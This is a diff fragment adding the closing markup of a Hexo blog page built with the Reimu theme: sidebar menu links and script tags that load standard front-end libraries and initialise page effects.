+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
